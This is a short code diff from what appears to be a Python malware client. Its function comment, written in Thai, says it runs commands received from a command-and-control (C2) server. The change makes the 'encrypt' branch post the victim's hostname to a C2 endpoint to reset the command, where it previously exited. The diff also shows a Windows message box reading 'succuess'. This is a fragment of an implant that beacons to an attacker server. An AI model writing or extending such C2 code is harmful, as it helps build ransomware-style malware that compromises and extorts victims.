@@ -28,7 +28,8 @@ def execute_command(cmd):
     """ดำเนินการตามคำสั่งที่ได้รับจาก C2"""
     if cmd == "encrypt":
         ctypes.windll.user32.MessageBoxW(0, "succuess", "succuess", 0x40)  # แสดงแจ้งเตือ
-        exit()
+        data = {"hostname": hostname, "cmd": None}
+        requests.post(f"{C2_URL}/set_command", json=data)
     elif cmd == "exit":
         exit()
 
